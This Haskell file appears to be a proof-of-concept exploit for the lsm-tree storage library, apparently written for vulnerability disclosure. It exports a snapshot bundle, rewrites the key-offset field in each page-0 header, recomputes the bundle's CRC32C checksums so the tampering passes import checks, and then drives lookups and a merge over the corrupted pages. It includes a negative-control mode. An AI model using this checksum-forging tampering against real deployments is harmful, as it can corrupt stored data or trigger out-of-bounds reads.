{-# LANGUAGE OverloadedStrings   #-}
{-# LANGUAGE TypeApplications    #-}
{-# LANGUAGE DataKinds           #-}
{-# LANGUAGE DerivingStrategies  #-}
{-# LANGUAGE DerivingVia         #-}
{-# LANGUAGE GeneralizedNewtypeDeriving #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# OPTIONS_GHC -Wno-orphans #-}

-- | END-TO-END PoC: a tampered snapshot bundle is imported through the public
-- 'importSnapshot' API and then opened with 'withTableFromSnapshot'; reading
-- the table walks a run page whose header offsets point outside the page.
--
-- Target : IntersectMBO/lsm-tree @ 63a63054
--
-- The bundle is NOT hand-built. It is produced by the library itself
-- ('saveSnapshot' + 'exportSnapshot'), then one field of every @.keyops@ page-0
-- header is overwritten and the corresponding CRC32C entries in the bundle's
-- @.checksums@ files are recomputed -- which is exactly what an attacker who
-- ships the bundle does, since the checksums are part of the bundle.
--
-- Run with @--control@ to skip the tampering: that is the negative control.
module Main (main) where

import           Control.Exception (SomeException, evaluate, try)
import           Control.Tracer (nullTracer)
import           Data.Bits (shiftR, (.&.))
import qualified Data.ByteString as BS
import qualified Data.ByteString.Char8 as BSC
import           Data.Char (intToDigit)
import           Data.List (isSuffixOf)
import           Data.Monoid (Sum (..))
import qualified Data.Vector as V
import           Data.Void (Void)
import           Data.Word (Word16, Word64, Word8)
import           Database.LSMTree (ResolveValue, Salt, SerialiseKey,
                     SerialiseValue, SnapshotMode (..), Table,
                     TableConfig (confWriteBufferAlloc),
                     WriteBufferAlloc (AllocNumEntries), defaultTableConfig,
                     exportSnapshot, getValue, importSnapshot, inserts,
                     lookups, saveSnapshot, withOpenSession,
                     withTableFromSnapshot, withTableWith)
import qualified Database.LSMTree.Internal.CRC32C as CRC
import qualified System.Directory as Dir
import           System.Environment (getArgs)
import           System.FilePath (takeBaseName, takeDirectory, (</>))
import qualified System.FS.API as FS
import           System.FS.BlockIO.IO (defaultIOCtxParams, withIOHasBlockIO)
import           System.IO (BufferMode (LineBuffering), hFlush, hSetBuffering,
                     stdout)

newtype Key = Key Word64
  deriving stock (Show, Eq, Ord)
  deriving newtype (SerialiseKey)

newtype Value = Value Word64
  deriving stock (Show, Eq)
  deriving newtype (SerialiseValue)
  deriving ResolveValue via Sum Word64

-- | One data page header: numKeys @ byte 0, numBlobs @ byte 2,
-- keysOffset @ byte 4 (all little-endian Word16).
keysOffsetField :: Int
keysOffsetField = 4

w16le :: Word16 -> [Word8]
w16le w = [fromIntegral (w .&. 0xFF), fromIntegral (w `shiftR` 8)]

hex8 :: Word64 -> String
hex8 = pad . go
  where
    go 0 = ""
    go n = go (n `div` 16) ++ [intToDigit (fromIntegral (n `mod` 16))]
    pad s = replicate (8 - length s) '0' ++ s

listAllFiles :: FilePath -> IO [FilePath]
listAllFiles d = do
    isDir <- Dir.doesDirectoryExist d
    if not isDir then pure [] else do
      entries <- Dir.listDirectory d
      fmap concat $ mapM (\e -> let p = d </> e in do
                                   isD <- Dir.doesDirectoryExist p
                                   if isD then listAllFiles p else pure [p]) entries

-- | Overwrite the keysOffset of page 0 in EVERY @.keyops@ file, then repair
-- every CRC32C entry in the bundle's @.checksums@ files.
tamperBundle :: FilePath -> Word16 -> IO (Maybe String)
tamperBundle root bogusOffset = do
    files <- listAllFiles root
    let keyops = [f | f <- files, ".keyops" `isSuffixOf` f]
        sums   = [f | f <- files, ".checksums" `isSuffixOf` f]
    if null keyops || null sums
      then pure Nothing
      else do
        mapM_ (patchFile bogusOffset) keyops
        mapM_ repairChecksums sums
        pure $ Just (show (length keyops) ++ " .keyops patched at keysOffset=0x"
                     ++ hex8 (fromIntegral bogusOffset)
                     ++ ", " ++ show (length sums) ++ " .checksums repaired")
  where
    patchFile off f = do
        bs <- BS.readFile f
        let patched = BS.take keysOffsetField bs
                        <> BS.pack (w16le off)
                        <> BS.drop (keysOffsetField + 2) bs
        BS.writeFile f patched

    -- entry names are file KINDS relative to the checksums file's own run
    -- number: 0.checksums covers 0.keyops, 0.blobs, ...
    repairChecksums sf = do
        let dir  = takeDirectory sf
            base = takeBaseName sf
        txt <- BS.readFile sf
        out <- mapM (fixLine dir base) (BSC.lines txt)
        BS.writeFile sf (BS.intercalate "\n" out <> "\n")

    fixLine dir base l =
        case BSC.stripPrefix "CRC32C (" l of
          Nothing -> pure l
          Just rest ->
            case BSC.break (== ')') rest of
              (name, rest2)
                | Just _rhs <- BSC.stripPrefix ") = " rest2
                , BSC.length _rhs == 8 -> do
                    let fp = dir </> (base ++ "." ++ BSC.unpack name)
                    exists <- Dir.doesFileExist fp
                    if not exists
                      then pure l
                      else do
                        bs <- BS.readFile fp
                        let CRC.CRC32C w = CRC.updateCRC32C bs CRC.initialCRC32C
                        pure $ "CRC32C (" <> name <> ") = "
                               <> BSC.pack (hex8 (fromIntegral w))
              _ -> pure l

main :: IO ()
main = do
    hSetBuffering stdout LineBuffering
    args <- getArgs
    let control = "--control" `elem` args
    say "=== lsm-tree end-to-end snapshot PoC ==="
    say $ "MODE: " ++ (if control then "CONTROL (bundle untouched)" else "TAMPERED (page header rewritten)")
    root <- Dir.getTemporaryDirectory
    let work = root </> ("lsm-e2e-poc" ++ (if control then "-ctl" else ""))
    Dir.removePathForcibly work
    Dir.createDirectoryIfMissing True work
    let sessionDir = FS.mkFsPath ["session"]
        exportDir  = FS.mkFsPath ["export"]

    withIOHasBlockIO (FS.MountPoint work) defaultIOCtxParams $ \hfs _hbio -> do
      FS.createDirectoryIfMissing hfs True sessionDir

      res <- try $ withOpenSession nullTracer hfs _hbio salt sessionDir $ \session ->
        withTableWith conf session $ \(table1 :: Table IO Key Value Void) -> do
          inserts table1 $ V.fromList [ (Key k, Value (k * 10), Nothing) | k <- [1..6] ]
          saveSnapshot "snap1" "KeyValueBlob" table1
          exportSnapshot session "snap1" (HardLink False) exportDir

          say "\n[1] legitimate bundle exported via exportSnapshot"
          tamperInfo <-
            if control
              then do say "  control mode: bundle NOT modified"
                      pure Nothing
              else do ti <- tamperBundle (work </> "export") 0xFFF0
                      case ti of
                        Nothing -> say "  TAMPER FAILED -- no .keyops/.checksums under export/"
                        Just s  -> say ("  tampered: " ++ s)
                      pure ti

          say "\n[2] importSnapshot through the public API"
          importSnapshot session "snap2" (HardLink False) exportDir
          say "  importSnapshot: OK -- no exception, CRC check passed"

          say "\n[3] withTableFromSnapshot + lookups (batch/arena path)"
          withTableFromSnapshot session "snap2" "KeyValueBlob" $ \(table2 :: Table IO Key Value Void) -> do
            r <- try $ do
                   rs <- lookups table2 (V.fromList (map Key [1..6]))
                   mapM evaluate (V.toList (V.map getValue rs))
            case r of
              Left (e :: SomeException) -> do
                say $ "  exception during lookup = " ++ takeLine (show e)
                say "  STEP3: bounded"
              Right vs -> do
                say $ "  lookups returned        = " ++ show vs
                say "  STEP3: no error raised"

            say "\n[4] force a merge -> RunReader sequential path (exactly-4096-byte pages)"
            r2 <- try $ do
                    inserts table2 $ V.fromList [ (Key k, Value (k * 10), Nothing) | k <- [7..40] ]
                    rs2 <- lookups table2 (V.fromList (map Key [1..40]))
                    mapM evaluate (V.toList (V.map getValue rs2))
            case r2 of
              Left (e :: SomeException) -> do
                say $ "  exception during merge  = " ++ takeLine (show e)
                say "  STEP4: bounded"
              Right vs2 -> do
                say $ "  after merge, lookups    = " ++ show (take 10 vs2) ++ " ..."
                say "  STEP4: sequential path consumed the page without error"
            pure ()
      case res of
        Left (e :: SomeException) -> say $ "\nTOP-LEVEL exception: " ++ takeLine (show e)
        Right () -> say "\nTOP-LEVEL: completed normally"
  where
    say s = putStrLn s >> hFlush stdout
    takeLine = takeWhile (/= '\n')
    salt :: Salt
    salt = 17
    conf :: TableConfig
    conf = defaultTableConfig { confWriteBufferAlloc = AllocNumEntries 3 }
